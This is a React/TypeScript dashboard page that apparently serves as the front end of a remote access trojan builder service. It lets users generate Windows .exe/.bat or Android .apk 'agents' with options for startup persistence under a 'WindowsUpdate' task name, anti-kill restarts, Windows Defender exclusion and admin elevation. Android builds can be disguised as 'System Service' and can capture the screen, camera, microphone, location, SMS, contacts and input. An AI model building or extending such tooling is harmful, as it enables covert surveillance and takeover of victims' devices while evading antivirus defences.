import { createFileRoute } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useState } from "react";
import { createPortal } from "react-dom";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/lib/auth-context";
import { createBuild } from "@/lib/builds.functions";
import { Download, Plus, X, Loader2, CheckCircle2, AlertCircle, ImageIcon, Trash2, Wrench, Monitor, Smartphone } from "lucide-react";

export const Route = createFileRoute("/dashboard/builder")({ component: BuilderPage });

type Build = {
  id: string;
  name: string;
  status: "queued" | "running" | "success" | "failed";
  download_url: string | null;
  error: string | null;
  output_kind: string;
  platform: string;
  created_at: string;
};

function BuilderPage() {
  const { user } = useAuth();
  const create = useServerFn(createBuild);
  const [builds, setBuilds] = useState<Build[]>([]);
  const [open, setOpen] = useState(false);
  const [serverOnline, setServerOnline] = useState<boolean | null>(null);

  const load = async () => {
    if (!user) return;
    const { data } = await supabase
      .from("builds")
      .select("id,name,status,download_url,error,output_kind,platform,created_at")
      .eq("user_id", user.id)
      .order("created_at", { ascending: false })
      .limit(20);
    setBuilds((data ?? []) as unknown as Build[]);
  };

  useEffect(() => { load(); }, [user]);

  useEffect(() => {
    if (!user) return;
    const ch = supabase
      .channel(`builds-${user.id}`)
      .on("postgres_changes",
        { event: "*", schema: "public", table: "builds", filter: `user_id=eq.${user.id}` },
        () => load())
      .subscribe();
    return () => { supabase.removeChannel(ch); };
  }, [user]);

  useEffect(() => {
    let cancelled = false;
    const ping = async () => {
      try {
        const r = await fetch("/api/public/buildserver/status", {
          method: "GET",
          signal: AbortSignal.timeout(5000),
          cache: "no-store",
        });
        const j = await r.json();
        if (!cancelled) setServerOnline(!!j.online);
      } catch {
        if (!cancelled) setServerOnline(false);
      }
    };
    ping();
    const interval = setInterval(ping, 10_000);
    return () => { cancelled = true; clearInterval(interval); };
  }, []);

  const queued = builds.filter((b) => b.status === "queued" || b.status === "running").length;
  const remove = async (id: string) => { await supabase.from("builds").delete().eq("id", id); };

  return (
    <div className="mx-auto max-w-4xl space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-semibold tracking-tight">Builder</h1>
          <p className="mt-1 text-xs text-muted-foreground">{queued}/2 in queue</p>
        </div>
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-1.5 rounded-full border border-border/60 bg-card/60 px-3 py-1.5">
            {serverOnline === null ? (
              <Loader2 className="h-3 w-3 animate-spin text-muted-foreground" />
            ) : serverOnline ? (
              <span className="relative flex h-2.5 w-2.5">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-emerald-500" />
              </span>
            ) : (
              <span className="inline-flex h-2.5 w-2.5 rounded-full bg-red-500" />
            )}
            <span className="text-xs font-medium text-muted-foreground">
              {serverOnline === null ? "Checking…" : serverOnline ? "Online" : "Offline"}
            </span>
          </div>
          <button
            onClick={() => setOpen(true)}
            disabled={queued >= 2}
            className="inline-flex items-center gap-2 rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition hover:opacity-90 disabled:opacity-40"
          >
            <Plus className="h-4 w-4" /> Create build
          </button>
        </div>
      </div>

      <div className="space-y-2">
        {builds.length === 0 && (
          <div className="rounded-xl border border-dashed border-border bg-card/40 p-10 text-center">
            <Wrench className="mx-auto h-8 w-8 text-muted-foreground" />
            <p className="mt-2 text-sm text-muted-foreground">—</p>
          </div>
        )}
        {builds.map((b) => (
          <div key={b.id} className="flex items-center gap-3 rounded-lg border border-border bg-card p-4 animate-in fade-in slide-in-from-bottom-2 duration-300">
            <StatusIcon s={b.status} />
            <div className="flex-1 min-w-0">
              <div className="flex items-center gap-2">
                {b.platform === "android" ? <Smartphone className="h-3.5 w-3.5 text-muted-foreground" /> : <Monitor className="h-3.5 w-3.5 text-muted-foreground" />}
                <span className="truncate font-medium">{b.name}</span>
                <span className="rounded bg-muted px-1.5 py-0.5 text-[10px] uppercase tracking-wide text-muted-foreground">.{b.output_kind}</span>
              </div>
              <div className="text-xs text-muted-foreground">
                {b.status === "success" ? "Ready" : b.status === "failed" ? (b.error ?? "Failed") : "Compiling…"}
                {" · "}{new Date(b.created_at).toLocaleString()}
              </div>
            </div>
            {b.status === "success" && (
              <a href={`/api/public/builds/${b.id}/download`} className="inline-flex items-center gap-1 rounded-md bg-primary px-3 py-1.5 text-xs font-medium text-primary-foreground hover:opacity-90">
                <Download className="h-3.5 w-3.5" /> Download
              </a>
            )}
            <button onClick={() => remove(b.id)} className="rounded-md p-1.5 text-muted-foreground hover:bg-accent hover:text-foreground">
              <Trash2 className="h-4 w-4" />
            </button>
          </div>
        ))}
      </div>

      {open && <CreateModal onClose={() => setOpen(false)} onCreate={create as any} userId={user!.id} />}
    </div>
  );
}

function StatusIcon({ s }: { s: Build["status"] }) {
  if (s === "success") return <CheckCircle2 className="h-5 w-5 text-emerald-500" />;
  if (s === "failed") return <AlertCircle className="h-5 w-5 text-red-500" />;
  return <Loader2 className="h-5 w-5 animate-spin text-primary" />;
}

function CreateModal({ onClose, onCreate, userId }: { onClose: () => void; onCreate: (args: { data: any }) => Promise<any>; userId: string }) {
  const [platform, setPlatform] = useState<"windows" | "android">("windows");
  const [name, setName] = useState("");
  const [startup, setStartup] = useState(false);
  const [startupName, setStartupName] = useState("");
  const [debug, setDebug] = useState(false);
  const [antikill, setAntikill] = useState(false);
  const [wdExclusion, setWdExclusion] = useState(false);
  const [requireAdmin, setRequireAdmin] = useState(false);
  const [funFeatures] = useState(true);
  const [tag, setTag] = useState("");
  const [outputKind, setOutputKind] = useState<"exe" | "bat" | "apk">("exe");
  const [iconFile, setIconFile] = useState<File | null>(null);
  const [busy, setBusy] = useState(false);
  // Android feature toggles
  const [featScreen, setFeatScreen] = useState(true);
  const [featCamera, setFeatCamera] = useState(true);
  const [featFiles, setFeatFiles] = useState(true);
  const [featMic, setFeatMic] = useState(true);
  const [featLocation, setFeatLocation] = useState(false);
  const [featSms, setFeatSms] = useState(false);
  const [featContacts, setFeatContacts] = useState(false);
  const [featNotifications, setFeatNotifications] = useState(true);
  const [featInput, setFeatInput] = useState(false);
  const [appDisplayName, setAppDisplayName] = useState("System Service");

  useEffect(() => {
    if (platform === "android") setOutputKind("apk");
    else setOutputKind("exe");
  }, [platform]);

  const submit = async () => {
    if (!/^[a-zA-Z0-9 _.-]+$/.test(name) || name.length < 1) {
      toast.error("Invalid name");
      return;
    }
    if (tag && !/^[a-zA-Z0-9 _-]+$/.test(tag)) {
      toast.error("Invalid tag");
      return;
    }
    setBusy(true);
    let iconUrl: string | null = null;
    if (iconFile) {
      const path = `${userId}/icons/${Date.now()}-${iconFile.name}`;
      const { error } = await supabase.storage.from("builds").upload(path, iconFile);
      if (error) { toast.error(error.message); setBusy(false); return; }
      iconUrl = supabase.storage.from("builds").getPublicUrl(path).data.publicUrl;
    }
    try {
      const data: any = {
        name, startup, startup_name: startupName || null, debug,
        tag: tag || null, output_kind: outputKind, icon_url: iconUrl,
        platform,
      };
      if (platform === "windows") {
        data.antikill = antikill;
        data.wd_exclusion = wdExclusion;
        data.require_admin = requireAdmin;
        data.fun_features = funFeatures;
      } else {
        data.antikill = false;
        data.wd_exclusion = false;
        data.require_admin = false;
        data.fun_features = false;
        data.android_features = {
          screen: featScreen, camera: featCamera, files: featFiles,
          mic: featMic, location: featLocation, sms: featSms,
          contacts: featContacts, notifications: featNotifications, input: featInput,
        };
        data.app_display_name = appDisplayName;
      }
      const res = await onCreate({ data });
      if (res?.ok === false) toast.error(res.error);
      else { toast.success("Build queued"); onClose(); }
    } catch (e: any) {
      toast.error(e?.message ?? "Failed");
    }
    setBusy(false);
  };

  if (typeof document === "undefined") return null;
  return createPortal(
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-background/80 backdrop-blur-sm p-4" onClick={onClose}>
      <div
        onClick={(e) => e.stopPropagation()}
        className="mx-4 flex max-h-[85vh] w-full max-w-md flex-col rounded-2xl border border-border bg-card p-6 shadow-2xl animate-in fade-in zoom-in-95"
      >
        <div className="flex items-center justify-between">
          <h2 className="text-lg font-semibold">Create build</h2>
          <button onClick={onClose} className="rounded-md p-1 hover:bg-accent">
            <X className="h-4 w-4 text-muted-foreground hover:text-foreground" />
          </button>
        </div>
        <div className="mt-4 flex-1 space-y-3 overflow-y-auto pr-1">
          {/* Platform selector */}
          <Field label="Platform">
            <div className="flex gap-2">
              <button onClick={() => setPlatform("windows")} className={`flex flex-1 items-center justify-center gap-2 rounded-md border px-3 py-2 text-sm font-medium transition ${platform === "windows" ? "border-primary bg-primary/15 text-primary" : "border-border bg-secondary text-muted-foreground"}`}>
                <Monitor className="h-4 w-4" /> Windows (.exe)
              </button>
              <button disabled className="relative flex flex-1 items-center justify-center gap-2 rounded-md border border-border bg-secondary px-3 py-2 text-sm font-medium text-muted-foreground opacity-60 cursor-not-allowed">
                <Smartphone className="h-4 w-4" /> Android (.apk)
                <span className="absolute -right-1 -top-1 rounded-full bg-yellow-500 px-1.5 py-0.5 text-[8px] font-bold uppercase text-black">Soon</span>
              </button>
            </div>
          </Field>

          <Field label="Build name">
            <input value={name} onChange={(e) => setName(e.target.value)} placeholder="my-agent" className="w-full rounded-md border border-border bg-input px-3 py-2 text-sm outline-none focus:border-primary" />
          </Field>

          {platform === "windows" && (
            <>
              <Field label="Output format">
                <div className="flex gap-2">
                  {(["exe","bat"] as const).map((k) => (
                    <button key={k} onClick={() => setOutputKind(k)} className={`flex-1 rounded-md border px-3 py-2 text-sm font-medium transition ${outputKind===k?"border-primary bg-primary/15 text-primary":"border-border bg-secondary text-muted-foreground"}`}>.{k}</button>
                  ))}
                </div>
              </Field>
              <Toggle label="Run on startup" v={startup} onChange={setStartup} />
              {startup && (
                <Field label="Startup task name">
                  <input value={startupName} onChange={(e) => setStartupName(e.target.value)} placeholder={name || "WindowsUpdate"} className="w-full rounded-md border border-border bg-input px-3 py-2 text-sm outline-none focus:border-primary" />
                </Field>
              )}
              <Toggle label="Debug console (show window)" v={debug} onChange={setDebug} />
              <Toggle label="Anti-kill / auto-restart" v={antikill} onChange={setAntikill} />
              <Toggle label="Windows Defender exclusion" v={wdExclusion} onChange={setWdExclusion} />
              <Toggle label="Require admin (UAC prompt)" v={requireAdmin} onChange={setRequireAdmin} />
            </>
          )}

          {platform === "android" && (
            <>
              <Field label="App display name">
                <input value={appDisplayName} onChange={(e) => setAppDisplayName(e.target.value)} placeholder="System Service" className="w-full rounded-md border border-border bg-input px-3 py-2 text-sm outline-none focus:border-primary" />
              </Field>
              <Toggle label="Start on boot" v={startup} onChange={setStartup} />
              <Toggle label="Debug (Logcat)" v={debug} onChange={setDebug} />
              <div className="rounded-md border border-border/60 p-3 space-y-2">
                <div className="text-xs font-medium text-muted-foreground">Features</div>
                <Toggle label="Screen capture" v={featScreen} onChange={setFeatScreen} />
                <Toggle label="Camera" v={featCamera} onChange={setFeatCamera} />
                <Toggle label="File manager" v={featFiles} onChange={setFeatFiles} />
                <Toggle label="Microphone" v={featMic} onChange={setFeatMic} />
                <Toggle label="Location (GPS)" v={featLocation} onChange={setFeatLocation} />
                <Toggle label="SMS reader" v={featSms} onChange={setFeatSms} />
                <Toggle label="Contacts" v={featContacts} onChange={setFeatContacts} />
                <Toggle label="Notifications" v={featNotifications} onChange={setFeatNotifications} />
                <Toggle label="Input (accessibility)" v={featInput} onChange={setFeatInput} />
              </div>
            </>
          )}

          <Field label="Tag (shown on Clients tab)">
            <input value={tag} onChange={(e) => setTag(e.target.value)} placeholder="home" maxLength={32} className="w-full rounded-md border border-border bg-input px-3 py-2 text-sm outline-none focus:border-primary" />
          </Field>
          <Field label="Custom icon (optional)">
            <label className="flex items-center gap-2 rounded-md border border-dashed border-border bg-secondary/40 px-3 py-2 text-sm cursor-pointer hover:bg-accent">
              <ImageIcon className="h-4 w-4" />
              <span className="truncate">{iconFile?.name ?? (platform === "android" ? "Choose .png" : "Choose .ico or .png")}</span>
              <input type="file" accept={platform === "android" ? ".png,image/png" : ".ico,.png,image/*"} className="hidden" onChange={(e) => setIconFile(e.target.files?.[0] ?? null)} />
            </label>
          </Field>
        </div>
        <div className="mt-5 flex gap-2">
          <button onClick={onClose} className="flex-1 rounded-md border border-border bg-secondary px-4 py-2 text-sm hover:bg-accent">Cancel</button>
          <button onClick={submit} disabled={busy} className="flex-1 rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground hover:opacity-90 disabled:opacity-50">
            {busy ? "Building…" : "Build"}
          </button>
        </div>
      </div>
    </div>,
    document.body,
  );
}

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div>
      <div className="mb-1 text-xs font-medium text-muted-foreground">{label}</div>
      {children}
    </div>
  );
}

function Toggle({ label, v, onChange }: { label: string; v: boolean; onChange: (b: boolean) => void }) {
  return (
    <label className="flex items-center justify-between rounded-md border border-border bg-secondary/40 px-3 py-2 text-sm cursor-pointer">
      <span>{label}</span>
      <button type="button" onClick={() => onChange(!v)} className={`h-5 w-9 rounded-full transition ${v?"bg-primary":"bg-muted"}`}>
        <span className={`block h-4 w-4 rounded-full bg-background transition ${v?"translate-x-[18px]":"translate-x-[2px]"}`} />
      </button>
    </label>
  );
}
